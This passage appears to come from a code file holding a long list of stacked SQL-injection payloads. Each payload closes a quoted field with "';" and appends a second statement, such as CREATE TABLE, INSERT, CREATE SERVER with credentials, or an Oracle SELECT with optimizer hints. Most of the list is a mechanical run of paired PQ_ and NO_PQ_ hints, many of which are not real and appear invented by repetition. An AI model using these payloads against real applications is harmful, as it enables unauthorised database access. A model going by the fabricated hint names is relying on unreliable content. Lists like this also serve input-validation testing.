            "'; REFRESH MATERIALIZED VIEW CONCURRENTLY view_name --",
            

            "'; CREATE TEMPORARY TABLE temp_table (id INT) --",
            "'; INSERT INTO temp_table VALUES (1) --",
            "'; SELECT * FROM temp_table --",
            

            "'; CREATE GLOBAL TEMPORARY TABLE gtt (id INT) ON COMMIT DELETE ROWS --",
            

            "'; CREATE EXTERNAL TABLE ext_table (col1 STRING) LOCATION 'hdfs://path' --",
            

            "'; CREATE SERVER fed_server FOREIGN DATA WRAPPER mysql OPTIONS (HOST 'remote', DATABASE 'db', USER 'user', PASSWORD 'pass') --",
            "'; CREATE TABLE fed_table (id INT) ENGINE=FEDERATED CONNECTION='fed_server' --",
            

            "'; CREATE TABLE part_table (id INT) PARTITION BY RANGE (id) (PARTITION p0 VALUES LESS THAN (10), PARTITION p1 VALUES LESS THAN (20)) --",
            

            "'; CREATE TABLE cluster_table (id INT) ORGANIZATION INDEX --",
            

            "'; CREATE TABLE iot_table (id INT PRIMARY KEY) ORGANIZATION INDEX --",
            

            "'; CREATE TYPE obj_type AS OBJECT (id INT, name VARCHAR2(50)) --",
            "'; CREATE TABLE obj_table OF obj_type --",
            

            "'; CREATE TYPE nested_type AS TABLE OF VARCHAR2(50) --",
            "'; CREATE TABLE parent_table (id INT, nested_col nested_type) NESTED TABLE nested_col STORE AS nested_table --",
            

            "'; CREATE TYPE varray_type AS VARRAY(10) OF VARCHAR2(50) --",
            "'; CREATE TABLE varray_table (id INT, varray_col varray_type) --",
            

            "'; CREATE TABLE lob_table (id INT, clob_col CLOB, blob_col BLOB) --",
            "'; INSERT INTO lob_table VALUES (1, EMPTY_CLOB(), EMPTY_BLOB()) --",
            

            "'; CREATE TABLE securefile_table (id INT, lob_col BLOB) LOB(lob_col) STORE AS SECUREFILE --",
            

            "'; CREATE TABLE encrypted_table (id INT, encrypted_col VARCHAR2(50) ENCRYPT USING 'AES256') --",
            

            "'; CREATE TABLE inmemory_table (id INT) INMEMORY --",
            

            "'; CREATE TABLE hcc_table (id INT) COMPRESS FOR QUERY HIGH --",
            

            "'; CREATE TABLE compressed_table (id INT) ROW STORE COMPRESS ADVANCED --",
            

            "'; CREATE TABLE flashback_table (id INT) FLASHBACK ARCHIVE --",
            

            "'; CREATE TABLE zone_map_table (id INT) WITH ZONEMAP --",
            

            "'; CREATE TABLE clustered_table (id INT, name VARCHAR2(50)) CLUSTERING BY LINEAR ORDER (id) --",
            

            "'; CREATE TABLE archive_table (id INT) ROW ARCHIVAL --",
            

            "'; CREATE TABLE temporal_table (id INT, valid_from DATE, valid_to DATE) PERIOD FOR user_valid_time (valid_from, valid_to) --",
            

            "'; CREATE TABLE json_table (id INT, json_col JSON) --",
            "'; INSERT INTO json_table VALUES (1, '{\"key\": \"value\"}') --",
            

            "'; CREATE TABLE xml_table (id INT, xml_col XMLTYPE) --",
            "'; INSERT INTO xml_table VALUES (1, XMLType('<root><element>value</element></root>')) --",
            

            "'; CREATE TABLE spatial_table (id INT, geom SDO_GEOMETRY) --",
            "'; INSERT INTO spatial_table VALUES (1, SDO_GEOMETRY(2001, NULL, SDO_POINT_TYPE(1,1,NULL), NULL, NULL)) --",
            

            "'; CREATE TABLE network_table (id INT, ip INET, cidr CIDR, mac MACADDR) --",
            

            "'; CREATE TABLE range_table (id INT, period DATERANGE) --",
            "'; INSERT INTO range_table VALUES (1, '[2023-01-01, 2023-12-31]') --",
            

            "'; CREATE DOMAIN email AS VARCHAR(255) CHECK (VALUE ~ '^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+[.][A-Za-z]+$') --",
            

            "'; CREATE TYPE mood AS ENUM ('sad', 'ok', 'happy') --",
            "'; CREATE TABLE enum_table (id INT, current_mood mood) --",
            

            "'; CREATE TYPE address AS (street VARCHAR(100), city VARCHAR(50), zip VARCHAR(10)) --",
            "'; CREATE TABLE composite_table (id INT, addr address) --",
            

            "'; SELECT * FROM generate_series(1,10) --",
            "'; SELECT * FROM regexp_split_to_table('a,b,c', ',') --",
            

            "'; SELECT * FROM table1, LATERAL (SELECT * FROM table2 WHERE table2.id = table1.id) sub --",
            

            "'; WITH RECURSIVE cte(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM cte WHERE n < 10) SELECT * FROM cte --",
            

            "'; SELECT SUM(col) OVER (ORDER BY id ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) FROM table --",
            

            "'; SELECT col1, col2, SUM(col3) FROM table GROUP BY GROUPING SETS ((col1), (col2), ()) --",
            

            "'; SELECT col1, col2, SUM(col3) FROM table GROUP BY CUBE (col1, col2) --",
            

            "'; SELECT col1, col2, SUM(col3) FROM table GROUP BY ROLLUP (col1, col2) --",
            

            "'; SELECT * FROM (SELECT col1, col2, col3 FROM table) PIVOT (SUM(col3) FOR col2 IN ('A', 'B', 'C')) --",
            

            "'; SELECT * FROM table UNPIVOT (value FOR name IN (col1, col2, col3)) --",
            

            "'; SELECT * FROM table MATCH_RECOGNIZE (PARTITION BY col1 ORDER BY col2 MEASURES A.col3 as start_val, LAST(B.col3) as end_val PATTERN (A B+) DEFINE A AS A.col4 > 0, B AS B.col4 < 100) --",
            

            "'; SELECT * FROM table MODEL DIMENSION BY (id) MEASURES (col1, col2) RULES (col1[1] = 100, col2[1] = col1[1] * 2) --",
            

            "'; SELECT LEVEL, LPAD(' ', 2*(LEVEL-1)) || col FROM table START WITH parent_id IS NULL CONNECT BY PRIOR id = parent_id --",
            

            "'; SELECT * FROM table AS OF TIMESTAMP SYSTIMESTAMP - INTERVAL '60' MINUTE --",
            

            "'; SELECT * FROM table VERSIONS BETWEEN TIMESTAMP MINVALUE AND MAXVALUE --",
            

            "'; SELECT * FROM table AS OF SCN 123456 --",
            

            "'; SELECT /*+ INMEMORY */ * FROM table --",
            

            "'; SELECT /*+ RESULT_CACHE */ * FROM table --",
            

            "'; SELECT /*+ MATERIALIZE */ * FROM table --",
            

            "'; SELECT /*+ PARALLEL(4) */ * FROM table --",
            

            "'; SELECT /*+ NO_PARALLEL */ * FROM table --",
            

            "'; SELECT /*+ FULL(table) */ * FROM table --",
            

            "'; SELECT /*+ INDEX(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ NO_INDEX(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ LEADING(t1 t2) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ ORDERED */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ USE_NL(t1 t2) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ USE_MERGE(t1 t2) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ USE_HASH(t1 t2) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ PUSH_PRED(t1) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ NO_PUSH_PRED(t1) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ PUSH_SUBQ */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ NO_PUSH_SUBQ */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ REWRITE */ * FROM table --",
            

            "'; SELECT /*+ NO_REWRITE */ * FROM table --",
            

            "'; SELECT /*+ MERGE */ * FROM table --",
            

            "'; SELECT /*+ NO_MERGE */ * FROM table --",
            

            "'; SELECT /*+ UNNEST */ * FROM table --",
            

            "'; SELECT /*+ NO_UNNEST */ * FROM table --",
            

            "'; SELECT /*+ STAR_TRANSFORMATION */ * FROM fact, dim1, dim2 WHERE fact.dim1_id = dim1.id AND fact.dim2_id = dim2.id --",
            

            "'; SELECT /*+ FACT(fact) */ * FROM fact, dim WHERE fact.dim_id = dim.id --",
            

            "'; SELECT /*+ NO_FACT(fact) */ * FROM fact, dim WHERE fact.dim_id = dim.id --",
            

            "'; SELECT /*+ CURSOR_SHARING_EXACT */ * FROM table WHERE col = :1 --",
            

            "'; SELECT /*+ DYNAMIC_SAMPLING(4) */ * FROM table --",
            

            "'; SELECT /*+ MONITOR */ * FROM table --",
            

            "'; SELECT /*+ NO_MONITOR */ * FROM table --",
            

            "'; SELECT /*+ GATHER_PLAN_STATISTICS */ * FROM table --",
            

            "'; SELECT /*+ NO_GATHER_PLAN_STATISTICS */ * FROM table --",
            

            "'; SELECT /*+ OPTIMIZER_FEATURES_ENABLE('12.1.0.2') */ * FROM table --",
            

            "'; SELECT /*+ ALL_ROWS */ * FROM table --",
            

            "'; SELECT /*+ FIRST_ROWS(10) */ * FROM table --",
            

            "'; SELECT /*+ CARDINALITY(table, 1000) */ * FROM table --",
            

            "'; SELECT /*+ SELECTIVITY(table, 0.1) */ * FROM table WHERE col = :1 --",
            

            "'; SELECT /*+ ACCESS(table) */ * FROM table --",
            

            "'; SELECT /*+ FILTER */ * FROM table --",
            

            "'; SELECT /*+ NO_FILTER */ * FROM table --",
            

            "'; SELECT /*+ NO_ACCESS(table) */ * FROM table --",
            

            "'; SELECT /*+ NO_EXPAND */ * FROM table --",
            

            "'; SELECT /*+ EXPAND */ * FROM table --",
            

            "'; SELECT /*+ NO_INDEX_FFS(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ INDEX_FFS(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ INDEX_SS(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ INDEX_SS_ASC(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ INDEX_SS_DESC(table index_name) */ * FROM table --",
            

            "'; SELECT /*+ INDEX_COMBINE(table index_name1 index_name2) */ * FROM table --",
            

            "'; SELECT /*+ AND_EQUAL(table index_name1 index_name2) */ * FROM table --",
            

            "'; SELECT /*+ USE_CONCAT */ * FROM table WHERE col1 = :1 OR col2 = :2 --",
            

            "'; SELECT /*+ NO_USE_CONCAT */ * FROM table WHERE col1 = :1 OR col2 = :2 --",
            

            "'; SELECT /*+ HASH_AJ */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ MERGE_AJ */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ NL_AJ */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ HASH_SJ */ * FROM t1 WHERE col IN (SELECT col FROM t2) --",
            

            "'; SELECT /*+ MERGE_SJ */ * FROM t1 WHERE col IN (SELECT col FROM t2) --",
            

            "'; SELECT /*+ NL_SJ */ * FROM t1 WHERE col IN (SELECT col FROM t2) --",
            

            "'; SELECT /*+ SEMIJOIN */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ NO_SEMIJOIN */ * FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ ANTIJOIN */ * FROM t1 WHERE NOT EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ NO_ANTIJOIN */ * FROM t1 WHERE NOT EXISTS (SELECT 1 FROM t2 WHERE t2.id = t1.id) --",
            

            "'; SELECT /*+ PLACE_GROUP_BY */ * FROM table --",
            

            "'; SELECT /*+ NO_PLACE_GROUP_BY */ * FROM table --",
            

            "'; SELECT /*+ PQ_DISTRIBUTE(t1 HASH HASH) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ NO_PQ_DISTRIBUTE(t1) */ * FROM t1, t2 WHERE t1.id = t2.id --",
            

            "'; SELECT /*+ PQ_SKEW(t1) */ * FROM t1 --",
            

            "'; SELECT /*+ NO_PQ_SKEW(t1) */ * FROM t1 --",
            

            "'; SELECT /*+ PQ_CONCURRENT */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CONCURRENT */ * FROM table --",
            

            "'; SELECT /*+ PQ_REPLICATE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_REPLICATE */ * FROM table --",
            

            "'; SELECT /*+ PQ_MAP */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_MAP */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOMAP */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOMAP */ * FROM table --",
            

            "'; SELECT /*+ PQ_BLOCKING */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_BLOCKING */ * FROM table --",
            

            "'; SELECT /*+ PQ_NONBLOCKING */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NONBLOCKING */ * FROM table --",
            

            "'; SELECT /*+ PQ_PRODUCER */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_PRODUCER */ * FROM table --",
            

            "'; SELECT /*+ PQ_CONSUMER */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CONSUMER */ * FROM table --",
            

            "'; SELECT /*+ PQ_TEMP_TABLE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_TEMP_TABLE */ * FROM table --",
            

            "'; SELECT /*+ PQ_KEEP */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_KEEP */ * FROM table --",
            

            "'; SELECT /*+ PQ_DROP */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_DROP */ * FROM table --",
            

            "'; SELECT /*+ PQ_ALL */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ALL */ * FROM table --",
            

            "'; SELECT /*+ PQ_NONE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NONE */ * FROM table --",
            

            "'; SELECT /*+ PQ_FIRST */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_FIRST */ * FROM table --",
            

            "'; SELECT /*+ PQ_LAST */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_LAST */ * FROM table --",
            

            "'; SELECT /*+ PQ_RANDOM */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_RANDOM */ * FROM table --",
            

            "'; SELECT /*+ PQ_HASH */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_HASH */ * FROM table --",
            

            "'; SELECT /*+ PQ_RANGE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_RANGE */ * FROM table --",
            

            "'; SELECT /*+ PQ_ROUND_ROBIN */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ROUND_ROBIN */ * FROM table --",
            

            "'; SELECT /*+ PQ_GRANULE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_GRANULE */ * FROM table --",
            

            "'; SELECT /*+ PQ_SLICE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SLICE */ * FROM table --",
            

            "'; SELECT /*+ PQ_CLUSTER */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CLUSTER */ * FROM table --",
            

            "'; SELECT /*+ PQ_NODE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NODE */ * FROM table --",
            

            "'; SELECT /*+ PQ_INSTANCE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_INSTANCE */ * FROM table --",
            

            "'; SELECT /*+ PQ_SERVER */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SERVER */ * FROM table --",
            

            "'; SELECT /*+ PQ_TASK */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_TASK */ * FROM table --",
            

            "'; SELECT /*+ PQ_PROCESS */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_PROCESS */ * FROM table --",
            

            "'; SELECT /*+ PQ_THREAD */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_THREAD */ * FROM table --",
            

            "'; SELECT /*+ PQ_CPU */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CPU */ * FROM table --",
            

            "'; SELECT /*+ PQ_MEMORY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_MEMORY */ * FROM table --",
            

            "'; SELECT /*+ PQ_IO */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_IO */ * FROM table --",
            

            "'; SELECT /*+ PQ_NETWORK */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NETWORK */ * FROM table --",
            

            "'; SELECT /*+ PQ_DISK */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_DISK */ * FROM table --",
            

            "'; SELECT /*+ PQ_BUFFER */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_BUFFER */ * FROM table --",
            

            "'; SELECT /*+ PQ_CACHE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CACHE */ * FROM table --",
            

            "'; SELECT /*+ PQ_SORT */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SORT */ * FROM table --",
            

            "'; SELECT /*+ PQ_HASHJOIN */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_HASHJOIN */ * FROM table --",
            

            "'; SELECT /*+ PQ_MERGEJOIN */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_MERGEJOIN */ * FROM table --",
            

            "'; SELECT /*+ PQ_NESTEDLOOP */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NESTEDLOOP */ * FROM table --",
            

            "'; SELECT /*+ PQ_UNION */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_UNION */ * FROM table --",
            

            "'; SELECT /*+ PQ_INTERSECT */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_INTERSECT */ * FROM table --",
            

            "'; SELECT /*+ PQ_MINUS */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_MINUS */ * FROM table --",
            

            "'; SELECT /*+ PQ_EXCEPT */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_EXCEPT */ * FROM table --",
            

            "'; SELECT /*+ PQ_GROUPBY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_GROUPBY */ * FROM table --",
            

            "'; SELECT /*+ PQ_AGGREGATE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_AGGREGATE */ * FROM table --",
            

            "'; SELECT /*+ PQ_WINDOW */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_WINDOW */ * FROM table --",
            

            "'; SELECT /*+ PQ_ANALYTIC */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ANALYTIC */ * FROM table --",
            

            "'; SELECT /*+ PQ_MODEL */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_MODEL */ * FROM table --",
            

            "'; SELECT /*+ PQ_SUBQUERY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SUBQUERY */ * FROM table --",
            

            "'; SELECT /*+ PQ_CORRELATED */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CORRELATED */ * FROM table --",
            

            "'; SELECT /*+ PQ_UNCORRELATED */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_UNCORRELATED */ * FROM table --",
            

            "'; SELECT /*+ PQ_INLINE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_INLINE */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOINLINE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOINLINE */ * FROM table --",
            

            "'; SELECT /*+ PQ_MATERIALIZE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_MATERIALIZE */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOMATERIALIZE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOMATERIALIZE */ * FROM table --",
            

            "'; SELECT /*+ PQ_SHARE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SHARE */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOSHARE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOSHARE */ * FROM table --",
            

            "'; SELECT /*+ PQ_DISTINCT */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_DISTINCT */ * FROM table --",
            

            "'; SELECT /*+ PQ_NODISTINCT */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NODISTINCT */ * FROM table --",
            

            "'; SELECT /*+ PQ_UNIQUE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_UNIQUE */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOUNIQUE */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOUNIQUE */ * FROM table --",
            

            "'; SELECT /*+ PQ_PRIMARY_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_PRIMARY_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_FOREIGN_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_FOREIGN_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOINDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOINDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_FULL */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_FULL */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOFULL */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOFULL */ * FROM table --",
            

            "'; SELECT /*+ PQ_ROWID */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ROWID */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOROWID */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOROWID */ * FROM table --",
            

            "'; SELECT /*+ PQ_CLUSTER_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CLUSTER_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOCLUSTER_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOCLUSTER_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_HASH_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_HASH_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOHASH_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOHASH_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_RANGE_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_RANGE_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NORANGE_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NORANGE_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_LIST_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_LIST_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOLIST_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOLIST_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_COMPOSITE_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_COMPOSITE_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOCOMPOSITE_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOCOMPOSITE_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_PARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_PARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOPARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOPARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_SUBPARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SUBPARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOSUBPARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOSUBPARTITION_KEY */ * FROM table --",
            

            "'; SELECT /*+ PQ_LOCAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_LOCAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOLOCAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOLOCAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_GLOBAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_GLOBAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOGLOBAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOGLOBAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_BITMAP_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_BITMAP_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOBITMAP_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOBITMAP_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_FUNCTION_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_FUNCTION_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOFUNCTION_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOFUNCTION_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_DOMAIN_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_DOMAIN_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NODOMAIN_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NODOMAIN_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_TEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_TEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOTEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOTEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_SPATIAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_SPATIAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOSPATIAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOSPATIAL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_XML_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_XML_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOXML_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOXML_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_CONTEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CONTEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOCONTEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOCONTEXT_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_CTXXPATH_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_CTXXPATH_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOCTXXPATH_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOCTXXPATH_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_RULE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_RULE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NORULE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NORULE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCIVARCHAR2_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCIVARCHAR2_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCIVARCHAR2_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCIVARCHAR2_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCITYPE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCITYPE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCITYPE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCITYPE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCIREF_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCIREF_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCIREF_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCIREF_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCITAB_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCITAB_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCITAB_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCITAB_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCICOLL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCICOLL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCICOLL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCICOLL_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCIDATE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCIDATE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCIDATE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCIDATE_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCINUMBER_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCINUMBER_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_NOODCINUMBER_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_NOODCINUMBER_INDEX */ * FROM table --",
            

            "'; SELECT /*+ PQ_ODCIBLOB_INDEX */ * FROM table --",
            

            "'; SELECT /*+ NO_PQ_ODCIBLOB_INDEX */ * FROM table --",
            

